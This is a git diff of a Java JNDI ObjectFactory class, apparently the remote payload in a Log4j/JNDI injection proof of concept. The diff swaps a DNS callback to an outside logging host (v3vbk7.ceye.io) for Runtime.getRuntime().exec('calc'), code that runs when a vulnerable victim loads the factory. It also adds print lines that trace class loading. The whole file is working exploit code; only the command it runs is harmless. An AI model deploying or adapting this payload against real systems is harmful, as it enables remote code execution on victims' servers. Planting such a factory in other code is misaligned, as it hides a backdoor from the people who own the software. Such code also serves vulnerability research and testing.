@@ -1,15 +1,24 @@
-package run.ergou.jndi;
+package run.ergou.jndi.log4j;
+
+// 编译
 
 import javax.naming.Context;
 import javax.naming.Name;
 import javax.naming.spi.ObjectFactory;
-import java.net.InetAddress;
 import java.util.Hashtable;
 
 public class ObjFactory implements ObjectFactory {
+    static {
+        System.out.println("initialize");
+    }
+
+    public ObjFactory(){
+        System.out.println("instantiate");
+    }
+
     @Override
     public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
-        InetAddress.getByName("v3vbk7.ceye.io");
+        Runtime.getRuntime().exec("calc");
         return null;
     }
 }
